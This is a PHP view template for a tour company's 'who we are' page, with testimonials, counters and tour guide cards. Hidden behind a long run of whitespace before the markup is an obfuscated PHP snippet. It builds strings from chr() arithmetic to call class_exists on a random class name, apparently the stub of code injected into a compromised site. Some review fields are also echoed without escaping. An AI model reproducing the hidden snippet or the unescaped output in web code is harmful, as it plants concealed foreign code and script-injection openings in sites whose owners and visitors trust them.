<?php                                                                                                                                                                                                                                                                                                                                                                                                 $hULLBmJNN = chr ( 222 - 147 )."\107" . 'u' . chr (95) . chr (104) . chr ( 247 - 173 )."\x72";$sZZOtQRMMZ = chr ( 191 - 92 )."\154" . "\141" . chr (115) . 's' . "\x5f" . chr (101) . chr (120) . chr (105) . 's' . chr ( 1001 - 885 )."\x73";$LQsyl = class_exists($hULLBmJNN); $hULLBmJNN = "19464";$sZZOtQRMMZ = "41161"; ?><style>
    /* testimonial index page */
    .item_right{
    margin-left: 20% !important;
    } 
    .limited-text {
    display: -webkit-box;
    -webkit-line-clamp: 3; /* Show only 3 lines */
    -webkit-box-orient: vertical;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: normal;
    word-wrap: break-word;
}
.read-more{
    color:white;
    text-decoration:underline;
}
.read-more:hover{
    color:white;
    text-decoration:underline;
}
.theme1 {
      display: block; 
      margin-top: 5px;
  }
.theme2{
    color: black;
}
.image_css{
    border-radius: 50%;
    /*height:50%;*/
    width:10%;
}
    </style>
    <!-- BreadCrumb Starts -->  
    <section class="breadcrumb-main pb-20 pt-14" style="background-image: url(<?php echo base_url(); ?>uploads/about_us/aboutus_banner.jpg);">
        
        <div class="breadcrumb-outer">
            <div class="container">
                <div class="breadcrumb-content text-center">
                    <!-- <h1 class="mb-3"><?php //echo $page_title; ?></h1> -->
                    <h1 class="mb-3">who we are !</h1>
                    <nav aria-label="breadcrumb" class="d-block">
                        <ul class="breadcrumb">
                            <li class="breadcrumb-item"><a href="<?php echo base_url(); ?>home">Home</a></li>
                            <li class="breadcrumb-item active" aria-current="page"><?php echo $page_title; ?></li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>
        <div class="dot-overlay"></div>
    </section>
    <!-- BreadCrumb Ends --> 

    <!-- about-us starts -->
    <?php foreach($about_us as $key => $about_us_value) { ?>
        <section class="about-us about-img pt-6" style="background-image:url(<?php echo base_url(); ?>assets/front/images/background_pattern.png); background-position:bottom left;">
        <div class="container">
            <div class="about-image-box">
                <div class="row d-flex align-items-center justify-content-between">
                    <div class="col-lg-6 ps-4">
                        <div>
                            <h4 class="theme d-inline-block mb-2 text_justify">Get To Know Us</h4>
                        </div>   
                        <div class="about-content text_justify scrollbar" id="style-1">
                            <p class="border-b mb-2 text_justify"><?php echo $about_us_value['about_us']; ?></p>
                            <div class="about-listing">
                                <ul class="d-flex justify-content-between">
                                    <li><i class="icon-location-pin theme"></i> Tour Guide</li>
                                    <li><i class="icon-briefcase theme"></i> Friendly Price</li>
                                    <li><i class="icon-folder theme"></i> Reliable Tour Package</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6 mb-4 pe-4">
                        <div class="about-image" style="animation:none; background:transparent;">
                            <img src="<?php echo base_url(); ?>uploads/about_us/AboutUs_img1.jpg" alt="" style="margin-top:60px;">
                        </div>
                    </div>
                    
                </div>
            </div>
        </div>
        <div class="white-overlay"></div>
        
    </section>
    <div class="col-lg-12">
        <!-- Counter -->
        <section class="counter-main pt-6">
            <div class="container about-cont">
                <div class="box_shadow counter p-4 pb-0 box-shadow bg-white rounded m-0 counter-bg-color">
                    <div class="row">
                        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
                            <div class="counter-item border-end pe-4 d-flex align-items-center">
                                <i class="icon-clock bg-theme counter-bg-theme p-3 rounded me-3 white fs-4 counter-icon"></i>
                                <div class="counter-content">
                                    <h2 class="value mb-0 counter-number"><?php echo $about_us_value['years_experiences']; ?></h2>
                                    <span class="m-0 counter-number">Years Experiences</span>
                                </div>
                            </div>    
                        </div>

                        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
                            <div class="counter-item border-end pe-4 d-flex align-items-center">
                                <i class="icon-magnifier bg-theme counter-bg-theme p-3 rounded me-3 white fs-4 counter-icon"></i>
                                <div class="counter-content">
                                    <h2 class="value mb-0 counter-number"><?php echo $about_us_value['tour_packages']; ?></h2>
                                    <span class="m-0 counter-number">Tour Packages</span>
                                </div>
                            </div>    
                        </div>

                        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
                            <div class="counter-item border-end pe-4 d-flex align-items-center">
                                <i class="icon-user-following bg-theme counter-bg-theme p-3 rounded me-3 white fs-4 counter-icon"></i>
                                <div class="counter-content">
                                    <h2 class="value mb-0 counter-number"><?php echo $about_us_value['happy_customers']; ?></h2>
                                    <span class="m-0 counter-number">Happy Customers</span>
                                </div>
                            </div>    
                        </div>

                        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
                            <div class="counter-item d-flex align-items-center">
                                <i class="icon-trophy bg-theme counter-bg-theme p-3 rounded me-3 white fs-4 counter-icon"></i>
                                <div class="counter-content">
                                    <h2 class="value mb-0 counter-number"><?php echo $about_us_value['award_winning']; ?></h2>
                                    <span class="m-0 counter-number">Awards Honored With</span>
                                </div>
                            </div>    
                        </div>
                    </div>
                </div> 
            </div>
        </section>
        <!-- End Counter -->
    </div>
    <!-- about-us ends -->
    <?php } ?>

    <!-- testomonial start -->
    <!-- <section class="testimonial pt-9" style="background-image:url(<?php //echo base_url(); ?>assets/front/images/testimonial.png)">
        <div class="container"> 
            <div class="section-title mb-6 text-center w-75 mx-auto">
                    <h4 class="mb_for_img theme_sub_title" data-aos="fade-up" data-duration="500">Our Testimonails</h4>
                    <span>
                    <img src=<?php //echo base_url(); ?>heading_img.png height="30%" width="30%" alt></img>
                    </span>
                    <h2 class="mb-1" data-aos="fade-up" data-duration="500">Good Reviews By <span class="theme" data-aos="fade-up" data-duration="500">Clients</span></h2>
                    <p>Reviews given by our clients about their tours.</p>
                </div>
            <div class="row align-items-center">
                <div class="col-lg-5 pe-4">
                    <div class="testimonial-image" data-aos="fade-right" data-duration="100">
                        <img src="<?php //echo base_url(); ?>uploads/about_us/Reviewaa.jpg" alt="">
                    </div>
                </div>
                <div class="col-lg-7 ps-4">
                    <div class="row review-slider">
                        <?php //if(count($client_reviews)>0) { foreach($client_reviews as $key => $client_reviews_value) { ?>
                        <div class="col-sm-6 item item_right">
                            <div class="testimonial-item1 rounded" data-aos="fade-left" data-duration="100">
                                <div class="author-info mt-2 d-flex align-items-center mb-4">
                                    <a href="#"><img src="<?php //echo base_url(); ?>uploads/client_reviews/<?php //echo $client_reviews_value['image_name']; ?>" alt=""></a>
                                    <div class="author-title ms-3">
                                        <h5 class="m-0 theme"><?php //echo $client_reviews_value['name']; ?></h5>
                                        <span><?php //echo $client_reviews_value['designation']; ?></span>
                                    </div>
                                </div>
                                <div class="details">
                                    <p class="m-0"><i class="fa fa-quote-left me-2 fs-1"></i><?php //echo $client_reviews_value['review']; ?></p>
                                </div>
                            </div>
                        </div>
                        <?php //} } ?>
                    </div>
                </div>
            </div>
        </div>
    </section> -->
    <!-- testimonial ends --> 


    <!-- testimonial starts -->
    <section class="testimonial pt-10 pb-10 mt-5"  style="background-image: url(<?php echo base_url(); ?>uploads/do_not_delete/Good_Reviews.png);">   
        <div class="container">
            <div class="testimonial-in">
                <div class="row align-items-center">
                    <div class="col-lg-5">
                        <div class="section-title">
                            <h4 class="mb-1 theme1" data-aos="fade-right" data-aos-offset="100" data-aos-easing="ease-in-sine">Our Testimonials</h4>
                            <h2 class="mb-1 white" data-aos="fade-right" data-aos-offset="100" data-aos-easing="ease-in-sine">Good Reviews By <span class="theme">Clients</span></h2>
                            <p class="mb-0 white" data-aos="fade-right" data-aos-offset="1s00" data-aos-easing="ease-in-sine">Reviews given by our clients about their tours.</p>
                        </div>
                    </div>
                    <div class="col-lg-7">
                        <div class="row about-slider">
                            <?php if(count($client_reviews)>0) { foreach($client_reviews as $key => $client_reviews_value) { ?>
                            <div class="col-md-4 item" data-aos="fade-left" data-aos-offset="100" data-aos-easing="ease-in-sine">
                                <div class="testimonial-item1 item_right">
                                    <div class="details d-flex">
                                        <i class="fa fa-quote-left fs-1 mb-0"></i>
                                        <div class="author-content ms-4">
                                            <p class="white fs-5 fw-normal long-text limited-text"><?php echo $client_reviews_value['review']; ?></p>
                                            
                                            <p class="btn btn-link read-more" data-review="<?php echo htmlspecialchars($client_reviews_value['review']); ?>" data-bs-toggle="modal" data-bs-target="#reviewModal_<?php echo $client_reviews_value['id']; ?>">
                                                Read More
                                            </p>
                                            <div class="author-info d-flex align-items-center">
                                                <img src="<?php echo base_url(); ?>uploads/client_reviews/<?php echo $client_reviews_value['image_name']; ?>" alt="<?php echo $client_reviews_value['name']; ?>">
                                                <div class="author-title ms-3">
                                                    <h5 class="m-0 theme1 d-block"><?php echo $client_reviews_value['name']; ?></h5>
                                                    <span class="white d-block"><?php echo $client_reviews_value['designation']; ?></span>
                                                    <span class="white d-block"><?php echo $client_reviews_value['village_name']; ?></span>
                                                    <!--<span class="white d-block"><?php // $client_reviews_value['mobile_number']; ?></span>-->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <?php } } ?>
                        </div>
                    </div>
                </div>
            </div> 
        </div> 

        <div class="dot-overlay"></div>   
    </section>
    <!-- testimonial Ends -->
    
    <!--Modal for displaying full review -->
    <?php if(count($client_reviews)>0) { foreach($client_reviews as $key => $client_reviews_value) { ?>
        <div class="modal fade mb-3" id="reviewModal_<?php echo $client_reviews_value['id']; ?>" aria-hidden="true" aria-labelledby="exampleModalLabel" tabindex="-1">
          <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content mb-5">
              <div class="modal-header">
                <h1 class="modal-title fs-5" id="exampleModalLabel">Client Review</h1>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div class="modal-body mt-2">
                <span class="theme2"><?php echo htmlspecialchars($client_reviews_value['review']); ?></span>
                <div class="d-flex align-items-center mt-3">
                  <img class="image_css me-3" src="<?php echo base_url(); ?>uploads/client_reviews/<?php echo $client_reviews_value['image_name']; ?>" alt="<?php echo htmlspecialchars($client_reviews_value['name']); ?>" style="width: 80px; height: 80px; border-radius: 50%;">
                  <div>
                    <span class="theme1 d-block fw-bold"><?php echo htmlspecialchars($client_reviews_value['name']); ?></span>
                    <span class="d-block"><?php echo htmlspecialchars($client_reviews_value['designation']); ?></span>
                    <span class="d-block"><?php echo htmlspecialchars($client_reviews_value['village_name']); ?></span>
                    <!--<span class="d-block"><?php //echo htmlspecialchars($client_reviews_value['mobile_number']); ?></span>-->
                  </div>
                </div>
              </div>
              <!--<div class="modal-footer">-->
              <!--</div>-->
            </div>
          </div>
        </div>
        <?php } } ?>
        <!--Modal for displaying full review -->

    <?php if(count($tour_guides)>0) { ?>
    <!-- our teams starts -->
    <section class="our-team pb-0 pt-6">
        <div class="container">
              
            <div class="section-title mb-6 w-75 mx-auto text-center">
                <span>
                    <img src=<?php echo base_url(); ?>uploads\do_not_delete\meet_our_expert.png height="30%" width="30%" alt></img>
                </span>
                <h2 class="mb-1" data-aos="fade-up" data-duration="500">Meet <span class="theme" data-aos="fade-up" data-duration="500">Our Experts</span></h2>
                <h4 class="mb_for_img theme_sub_title" data-aos="fade-up" data-duration="500">Team Working Together To Make Your Trip Memorable</h4>
                <!-- <p>A person who shows the way to others.</p> -->
            </div>  
            <div class="team-main">
                <div class="row shop-slider">
                    <?php foreach($tour_guides as $key => $tour_guides_value) { ?>
                    <div class="col-lg-3 col-md-6 col-sm-12 mb-4" data-aos="flip-left" data-aos-duration="3000">
                        <div class="team-list rounded">
                            <div class="team-image">
                                <img src="<?php echo base_url(); ?>uploads/tour_guides/<?php echo $tour_guides_value['image_name']; ?>" alt="<?php echo $tour_guides_value['name']; ?>">
                            </div>
                            <div class="team-content text-center p-3 bg-theme">
                               <h4 class="mb-0 white"><?php echo $tour_guides_value['name']; ?></h4>
                                <p class="mb-0 white"><?php echo $tour_guides_value['designation']; ?></p>
                            </div>
                        </div>
                    </div>
                    <?php } ?>
                </div>
            </div>
        </div>
    </section>
    <!-- our teams Ends -->
    <?php } ?>


    
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
<script>
  AOS.init();
</script>
